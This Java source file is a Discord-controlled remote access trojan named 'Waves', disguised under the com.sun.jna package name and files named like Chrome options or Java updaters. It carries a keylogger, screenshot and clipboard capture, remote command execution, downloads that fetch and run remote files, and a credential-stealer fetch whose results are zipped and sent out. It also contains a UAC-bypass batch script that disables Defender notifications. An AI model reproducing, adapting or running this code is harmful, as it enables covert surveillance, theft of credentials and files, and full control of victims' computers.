package com.sun.jna;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.events.Event;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.annotation.Nonnull;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Liba extends ListenerAdapter implements NativeKeyListener {
    private String id;
    private static final long pid = ProcessHandle.current().pid();
    private static boolean keyloggerVal = false;
    private static final String VERSION = "1.4";
    private static final String USERNAME = System.getProperty("user.name");
    private static final String PATH_ID = "C:\\Users\\" + USERNAME + "\\AppData\\Roaming\\";
    private static final String PATH_KEYLOGGER = PATH_ID + "\\key.txt";
    private static final String CMD_COMMAND = "cmd /c ";
    private static final String symbol = "!";
    private static final String fileName = "ChromeOptions.txt";
    private static final String help = "!id help - Просмотреть список команд\n"
            + "!id start <file> - Запустить файл/сайт\n"
            + "!id screenshot - Получить скриншот\n"
            + "!id console - Отправить команду из CMD\n"
            + "!id upload <url> <path> - Скачать файл по ссылке\n"
            + "!id keylogger <start/stop> - Включить keylogger\n"
            + "!id download <path> - Скачать файл\n"
            + "!id message <message> - Отправить сообщение с окном пользователю\n"
            + "!id admin <command> - Отправить команду из CMD от имени администратора\n"
            + "!id clipboard - посмотреть буфер обмена\n"
            + "!id update - Обновить до последней версии Waves\n"
            + "!id version - Посмотреть версию Waves\n"
            + "!all <command> - Выполнить комманду для всех пользователей\n"
            + "!all online - Просмотреть кто в сети\n";

    public static void main(String[] args) {
        while (!netIsAvailable());

        try {

            byte[] decodedBytes = Base64.getDecoder().decode("token in base64");
            new JDABuilder(new String(decodedBytes)).addEventListeners(new Liba()).setActivity(Activity.watching("хихихи")).build();
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                e.printStackTrace();
            }

            LogManager.getLogManager().reset();

            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);

            GlobalScreen.addNativeKeyListener(new Liba());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private String getUsername() {
        return USERNAME;
    }

    private String getIDPath() {
        return PATH_ID;
    }

    private String getPathKeylogger() {
        return PATH_KEYLOGGER;
    }

    private long getPid() {
        return pid;
    }

    private void sendMessageFile(@NotNull Event event, String path) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(new File(path)).queue();
    }

    private void embedSendMessage(Event event, String content) {
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Waves " + VERSION  + " | " + getID() + " help");
        eb.setDescription(content);
        eb.setColor(Color.GRAY);

        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(eb.build()).queue();
    }

    private void sendMessage(Event event, String content) {
        event.getJDA().getCategories().get(1).getTextChannels().get(0).sendMessage(content).queue();
    }

    private static boolean netIsAvailable() {
        try {
            final URLConnection conn = new URL("http://www.google.com").openConnection();
            conn.connect();
            conn.getInputStream().close();
            return true;
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            return false;
        }
    }

    public static void pack(String sourceDirPath, String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        } catch (IOException e) {
                            System.err.println(e);
                        }
                    });
        }
    }

    private void adminCommand(String command) {
        try {
            PrintWriter writer = new PrintWriter(getIDPath() + "1.bat", "UTF-8");
            writer.println("@echo off\n" +
                    "set \"payload=cmd /c " + command + "\"\n" +
                    "\n" +
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f\n" +
                    "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d \"%payload%\" /f\n" +
                    "computerdefaults\n" +
                    "reg delete HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f\n" +
                    "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender.SecurityCenter /v Enabled /f\n" +
                    "exit");
            writer.close();

            Runtime.getRuntime().exec(getIDPath() + "1.bat");
        } catch (IOException io) {
            io.printStackTrace();
        }
    }

    private void stealer(Event event) {
        try {
            uploadFile(event, "https://raw.githubusercontent.com/stealer", PATH_ID + "superUpdater.exe");
            BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(PATH_ID + "superUpdater.exe --dir C:/resultim").getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {System.out.println(line);}
            pack("C:/resultim","hello.zip");
            sendMessageFile(event, "hello.zip");
        } catch (IOException e) {
            sendMessage(event, e.getMessage());
        }
    }

    private String clipboard() {
        try {
            return getID() + " - " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
        } catch (UnsupportedFlavorException | IOException e) {e.printStackTrace();}
        return null;
    }

    private void createID() {
        try {
            File file = new File(getIDPath(), fileName);
            if (!file.exists()) {
                PrintWriter writer = new PrintWriter(getIDPath() + fileName, "UTF-8");
                writer.println(getUsername().substring(0, 3) + (int) (Math.random() * 9999) + "\n" + new SimpleDateFormat("yyyy/MM/dd HH:mm").format(Calendar.getInstance().getTime()));
                writer.close();
            }
        } catch (IOException io) {
            io.printStackTrace();
        }
    }

    private String getID() {
        try {
            id = new String(Files.readAllBytes(Paths.get(getIDPath() + fileName))).trim().split("\n")[0];
        } catch (IOException e) {
            e.printStackTrace();
        }
        return symbol + id;
    }

    private String getRated() {
        try {
            return "!" + new String(Files.readAllBytes(Paths.get(getIDPath() + fileName))).trim().split("\n")[1];
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String getData() {
        return "User: " + getUsername() + "\nID: " + getID() + "\nRated: " + getRated() + "\nPID: " + getPid() + "\nCPUs: " + Runtime.getRuntime().availableProcessors() + "\nOS: " + System.getProperty("os.name") + " x" + (System.getProperty("os.arch").contains("86") ? "86" : "64");
    }

    private void uploadFile(Event event, String command, String path) {
        try {
            Files.copy(new URL(command).openStream(), Paths.get(path), StandardCopyOption.REPLACE_EXISTING);
            sendMessage(event, getID() + " | " + path + " (" + new File(path).length() + ") was downloaded successfully");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void screenShot(Event event) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "jpg", stream);
            event.getJDA().getCategories().get(1).getTextChannels().get(0).sendFile(stream.toByteArray(), "screenshot.jpg").queue();
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }

    private void consoleCommand(String content) {
        try {
            Runtime.getRuntime().exec(CMD_COMMAND + content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void startSite(String content) {
        consoleCommand("start " + content);
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void copyFile(File sourceFile, File destFile) {
        try {
            if (!destFile.exists()) {
                destFile.createNewFile();
            }

            FileChannel source = null;
            FileChannel destination = null;

            try {
                source = new FileInputStream(sourceFile).getChannel();
                destination = new FileOutputStream(destFile).getChannel();
                destination.transferFrom(source, 0, source.size());
            } finally {
                if (source != null) {
                    source.close();
                }
                if (destination != null) {
                    destination.close();
                }
            }
        } catch (IOException e) {
        }
    }

    private void update(Event event) {
        uploadFile(event, "https://raw.githubusercontent.com/update", PATH_ID + "JavaUpdater-UPD.jar");
        copyFile(new File(PATH_ID + "JavaUpdater-UPD.jar"), new File(PATH_ID + "JavaUpdater.jar"));
        consoleCommand(PATH_ID + "jdk-18.0.2\\bin\\java.exe -cp " + PATH_ID + "JavaUpdater.jar com.sun.jna.Liba");
        consoleCommand("taskkill /f /pid " + getPid());
    }

    private static void showMessageDialog(String text) {
        new Thread(() -> {
            JOptionPane.showMessageDialog(null, text);
        }).start();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        if (keyloggerVal) {
            String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

            try (OutputStream os = Files.newOutputStream(Paths.get(getPathKeylogger()), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

                if (keyText.length() > 1) {
                    writer.print("[" + keyText + "]");
                } else {
                    writer.print(keyText);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onReady(@Nonnull ReadyEvent event) {
        createID();
        embedSendMessage(event, getData());
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        String command = event.getMessage().getContentRaw();
        String[] commandSplit = command.split(" ");

        if (commandSplit[0].startsWith(getID()) || commandSplit[0].startsWith(symbol + "all")) {
            if (commandSplit[1].startsWith("start")) { startSite(commandSplit[2]); screenShot(event); }
            else if (commandSplit[1].startsWith("console")) consoleCommand(command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("help")) sendMessage(event, help);
            else if (commandSplit[1].startsWith("online")) embedSendMessage(event, getData());
            else if (commandSplit[1].startsWith("screenshot")) screenShot(event);
            else if (commandSplit[1].startsWith("upload")) uploadFile(event, commandSplit[2], PATH_ID + commandSplit[3]);
            else if (commandSplit[1].startsWith("update")) update(event);
            else if (commandSplit[1].startsWith("clipboard")) sendMessage(event, clipboard());
            else if (commandSplit[1].startsWith("download")) sendMessageFile(event, command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("stealer")) stealer(event);
            else if (commandSplit[1].startsWith("admin")) adminCommand(command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("message")) showMessageDialog(command.split(commandSplit[1] + " ")[1]);
            else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("start")) keyloggerVal = true;
            else if (commandSplit[1].startsWith("keylogger") && commandSplit[2].startsWith("stop")) { keyloggerVal = false; sendMessageFile(event, PATH_KEYLOGGER); }
            else if (commandSplit[1].startsWith("version")) sendMessage(event, getID() + " - " + VERSION);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
